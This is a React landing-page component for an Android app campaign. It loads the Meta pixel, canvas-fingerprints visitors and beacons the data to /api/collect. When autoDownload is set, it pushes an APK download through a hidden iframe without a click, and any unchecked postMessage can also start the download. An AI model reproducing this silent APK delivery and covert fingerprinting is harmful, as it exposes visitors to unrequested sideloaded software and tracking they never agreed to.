"use client";

import { useCallback, useEffect, useRef, useState } from "react";

interface MetaBrowserConfig {
  pixelId: string;
}

interface Props {
  apkUrl: string;
  autoDownload: boolean;
  promo: string;
  templateUrl: string;
  trackDownload?: boolean;
  meta?: MetaBrowserConfig | null;
}

function ensureMetaPixel(pixelId: string) {
  const w = window as any;
  if (!w.fbq) {
    const fbq = function (...args: unknown[]) {
      if (fbq.callMethod) fbq.callMethod.apply(fbq, args);
      else fbq.queue.push(args);
    } as any;
    fbq.queue = [];
    fbq.loaded = true;
    fbq.version = "2.0";
    w.fbq = fbq;
    w._fbq = fbq;

    const script = document.createElement("script");
    script.async = true;
    script.src = "https://connect.facebook.net/en_US/fbevents.js";
    document.head.appendChild(script);
  }
  if (!w.__metaPixelInited) w.__metaPixelInited = {};
  if (!w.__metaPixelInited[pixelId]) {
    w.fbq("init", pixelId);
    w.__metaPixelInited[pixelId] = true;
  }
}

function getMetaCookie(name: string): string {
  const prefix = `${name}=`;
  const part = document.cookie.split(";").map((item) => item.trim()).find((item) => item.startsWith(prefix));
  return part ? decodeURIComponent(part.slice(prefix.length)) : "";
}

function buildFingerprint(): string {
  const parts: string[] = [
    navigator.userAgent,
    navigator.language,
    screen.width + "x" + screen.height + "x" + screen.colorDepth,
    String(new Date().getTimezoneOffset()),
    String((navigator as any).hardwareConcurrency || ""),
    String((navigator as any).deviceMemory || ""),
  ];
  try {
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    if (ctx) {
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillText("fp-probe-中文", 2, 2);
      parts.push(c.toDataURL());
    }
  } catch {}
  let h = 0;
  const s = parts.join("|");
  for (let i = 0; i < s.length; i++) {
    h = (h << 5) - h + s.charCodeAt(i);
    h |= 0;
  }
  return Math.abs(h).toString(16);
}

export default function TemplateLanding({
  apkUrl,
  autoDownload,
  promo,
  templateUrl,
  trackDownload = true,
  meta,
}: Props) {
  const started = useRef(false);
  const collected = useRef(false);
  const downloadMarked = useRef(false);
  const downloadFrames = useRef<HTMLIFrameElement[]>([]);
  const cleanupTimers = useRef<number[]>([]);
  const [iframeUrl, setIframeUrl] = useState(templateUrl);

  const getVisitId = useCallback(() => {
    const params = new URLSearchParams(window.location.search);
    const visitId = Number(params.get("v") || 0);
    return Number.isFinite(visitId) ? visitId : 0;
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;
    try {
      const url = new URL(templateUrl, window.location.origin);
      const current = new URLSearchParams(window.location.search);
      current.forEach((value, key) => {
        if (value !== null) url.searchParams.set(key, value);
      });
      setIframeUrl(url.pathname + url.search + url.hash);
    } catch {
      setIframeUrl(templateUrl);
    }
  }, [templateUrl]);

  const markDownloaded = useCallback((visitId: number) => {
    if (!trackDownload || !visitId || downloadMarked.current) return;
    downloadMarked.current = true;
    navigator.sendBeacon?.(
      "/api/downloaded",
      new Blob([JSON.stringify({
        id: visitId,
        eventId: `lead_${visitId}`,
        fbp: getMetaCookie("_fbp"),
        fbc: getMetaCookie("_fbc"),
        fbclid: new URLSearchParams(window.location.search).get("fbclid") || "",
        url: window.location.href,
      })], { type: "application/json" })
    );
  }, [trackDownload]);

  const triggerDownload = useCallback(() => {
    if (!apkUrl) return;

    const visitId = getVisitId();
    markDownloaded(visitId);

    const iframe = document.createElement("iframe");
    iframe.src = apkUrl;
    iframe.title = "download";
    iframe.setAttribute("aria-hidden", "true");
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    downloadFrames.current.push(iframe);
    const timer = window.setTimeout(() => {
      iframe.remove();
      downloadFrames.current = downloadFrames.current.filter((item) => item !== iframe);
      cleanupTimers.current = cleanupTimers.current.filter((item) => item !== timer);
    }, 15000);
    cleanupTimers.current.push(timer);
  }, [apkUrl, getVisitId, markDownloaded]);

  useEffect(() => {
    if (!meta?.pixelId) return;
    ensureMetaPixel(meta.pixelId);
  }, [meta]);

  useEffect(() => {
    if (collected.current) return;
    collected.current = true;

    const conn = (navigator as any).connection;
    const payload = {
      id: getVisitId(),
      promo,
      screen: `${screen.width}x${screen.height}@${window.devicePixelRatio}x`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      network: conn ? conn.effectiveType || "" : "",
      fingerprint: buildFingerprint(),
      eventId: `vc_${getVisitId()}`,
      fbp: getMetaCookie("_fbp"),
      fbc: getMetaCookie("_fbc"),
      fbclid: new URLSearchParams(window.location.search).get("fbclid") || "",
      url: window.location.href,
    };

    navigator.sendBeacon?.("/api/collect", new Blob([JSON.stringify(payload)], { type: "application/json" }));
  }, [getVisitId, promo]);

  useEffect(() => {
    const onMessage = (event: MessageEvent) => {
      if (event.data?.type === "landing:download") triggerDownload();
    };
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, [triggerDownload]);

  useEffect(() => {
    if (started.current || !autoDownload || !apkUrl) return;
    started.current = true;
    const t = setTimeout(() => triggerDownload(), 1000);
    return () => clearTimeout(t);
  }, [apkUrl, autoDownload, triggerDownload]);

  useEffect(() => {
    return () => {
      cleanupTimers.current.forEach((timer) => window.clearTimeout(timer));
      downloadFrames.current.forEach((frame) => frame.remove());
      cleanupTimers.current = [];
      downloadFrames.current = [];
    };
  }, []);

  return (
    <main style={{ minHeight: "100vh", background: "#fff" }}>
      <iframe
        title="landing-template"
        src={iframeUrl}
        sandbox="allow-scripts"
        style={{
          display: "block",
          width: "100%",
          height: "100vh",
          minHeight: "100vh",
          border: 0,
          background: "#fff",
        }}
      />
    </main>
  );
}
